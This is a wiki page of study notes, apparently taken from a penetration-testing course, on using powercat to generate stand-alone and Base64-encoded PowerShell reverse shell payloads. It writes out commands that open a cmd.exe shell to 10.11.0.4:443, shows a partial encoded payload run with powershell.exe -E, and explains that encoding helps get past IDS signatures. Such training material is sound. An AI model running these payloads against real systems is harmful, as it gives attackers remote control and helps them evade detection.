@@ -1,0 +1,50 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T13:42:49-04:00
+
+====== standalone payloads ======
+Created Tuesday 19 May 2020
+
+Powercat can also generate stand-alone payloads. 99 In the context of powercat, a payload is a set
+of powershell instructions as well as the portion of the powercat script itself that only includes the
+features requested by the user. Let’s experiment with payloads in this next example.
+After starting a listener on Alice’s machine, we create a stand-alone reverse shell payload by adding
+the -g option to the previous powercat command and redirecting the output to a file. This will
+produce a powershell script that Bob can execute on his machine:
+
+**PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1**
+**PS C:\Users\offsec> ./reverseshell.ps1**
+
+
+It’s worth noting that stand-alone payloads like this one might be easily detected by IDS.
+Specifically, the script that is generated is rather large with roughly 300 lines of code. Moreover, it
+also contains a number of hardcoded strings that can easily be used in signatures for malicious
+activity. While the identification of any specific signature is outside of scope of this module, it is
+sufficient to say that plaintext malicious code such as this will likely have a poor success rate and
+will likely be caught by defensive software solutions.
+We can attempt to overcome this problem by making use of PowerShell’s ability to execute Base64
+encoded commands. To generate a stand-alone encoded payload, we use the -ge option and once
+again redirect the output to a file:
+
+
+**PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.**
+**ps1**
+
+Listing 122 - Creating an encoded stand-alone payload with powercat
+The file will contain an encoded string that can be executed using the PowerShell **-E**
+(EncodedCommand) option. However, since the -E option was designed as a way to submit
+complex commands on the command line, the resulting **encodedreverseshell.ps1** script can not be
+executed in the same way as our unencoded payload. Instead, Bob needs to pass the whole
+encoded string to **powershell.exe -E** :
+
+
+**PS C:\Users\offsec> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM**
+**AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzA**
+**CkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQB**
+**yAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAb**
+**wBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAo**
+**AIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByA**
+**HMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIAB**
+**OAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAc**
+**ABDAGwAaQBlAG4AdAAKACAAIAAgACA**
+...
